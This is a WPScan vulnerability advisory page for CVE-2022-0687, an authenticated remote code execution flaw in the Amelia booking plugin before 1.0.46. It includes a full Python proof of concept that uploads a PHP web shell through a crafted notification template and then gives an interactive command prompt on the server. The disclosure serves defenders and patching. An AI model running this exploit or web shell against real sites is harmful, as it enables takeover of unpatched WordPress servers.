=== Content from wpscan.com_824d1720_20250114_231556.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Amelia < 1.0.46 - Manager+ RCE

### Description

The plugin stores image blobs into actual files whose extension is controlled by the user, which may lead to PHP backdoors being uploaded onto the site. This vulnerability can be exploited by logged-in users with the custom "Amelia Manager" role.

### Proof of Concept

import requests
import base64
BASE\_URL = "http://localhost:8000"
id = "wordpress"
pw = "wordpress"
def login(id, pw) :
sess = requests.Session()
sess.post(
BASE\_URL + "/wp-login.php",
data = {
'log': id,
'pwd': pw,
'wp-submit': '%EB%A1%9C%EA%B7%B8%EC%9D%B8',
'testcookie': '1'
}
).text
return sess
def exploit(sess) :
SHELLCODE = b"<?php echo(passthru($\_POST['qerogram']));?>"
payload = r'''{"id":1,"name":"customer\_appointment\_approved","customName":null,"status":"enabled","type":"email","entity":"appointment","time":null,"timeBefore":null,"timeAfter":null,"sendTo":"customer","subject":"%service\_name% Appointment Approved",'''
payload += r'''"content":"<p>Dear <strong><img src=\"data:image/php;,''' + base64.b64encode(SHELLCODE).decode()
payload += r'''\">%customer\_full\_name%</strong>,</p><p><br></p><p>You have successfully scheduled <strong>%service\_name%</strong> appointment with <strong>%employee\_full\_name%</strong>. We are waiting you at <strong>%location\_address% </strong>on <strong>%appointment\_date\_time%</strong>.</p><p><br></p><p>Thank you for choosing our company,</p><p><strong>%company\_name%</strong></p>","translations":null,"entityIds":null,"sendOnlyMe":null}'''
res = sess.post(
f"{BASE\_URL}/wp-admin/admin-ajax.php?action=wpamelia\_api&call=/notifications/1",
data = payload,
headers = {"Content-Type": "application/json;charset=UTF-8"}
)
SHELL\_ADDR = res.json()['data']['notification']['content']
SHELL\_ADDR = SHELL\_ADDR[SHELL\_ADDR.find('src="')+5:]
SHELL\_ADDR = SHELL\_ADDR[:SHELL\_ADDR.find('"')]
while True :
cmd = input("$ ")
if cmd.lower() == "exit" or cmd.lower() == "quit" :
break
res = sess.post(
SHELL\_ADDR,
data = {"qerogram" : cmd}
)
print(res.text)
sess = login(id,pw)
exploit(sess)

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

ameliabooking](https://a8cteam5105.wordpress.com/plugin/ameliabooking/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.0.46

### References

CVE
[CVE-2022-0687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0687)

### Miscellaneous

Original Researcher
qerogram

Submitter
qerogram

Submitter website
<https://github.com/qerogram>

Verified
Yes

WPVDB ID
[3cf05815-9b74-4491-a935-d69a0834146c](https://a8cteam5105.wordpress.com/vulnerability/3cf05815-9b74-4491-a935-d69a0834146c/)

### Timeline

Publicly Published
2022-02-23 (about 2 years ago)

Added
2022-02-23 (about 2 years ago)

Last Updated
2022-04-12 (about 2 years ago)

### Other

Published
Title

Published
2024-01-18
Title
[AI Engine < 2.1.5 - Editor+ Arbitrary File Upload via add\_image\_from\_url](https://a8cteam5105.wordpress.com/vulnerability/907abe84-0ac5-43d5-bbbc-d32c34cc3fa5/)

Published
2022-12-19
Title
[WPtouch < 4.3.45 - Admin+ Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/f927dbe0-3939-4882-a469-1309ac737ee6/)

Published
2014-08-01
Title
[Complete Gallery Manager 3.3.3 - Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/a04a07e8-15ce-4780-9be6-7d609d2632f3/)

Published
2022-07-12
Title
[User Private Files < 1.1.3 - Subscriber+ Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/67f3948e-27d4-47a8-8572-616143b9cf43/)

Published
2024-06-14
Title
[FooEvents for WooCommerce < 1.19.21 - Improper Authorization to (Contributor+) Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/72504efc-f331-4054-aa1c-665c74d1854c/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

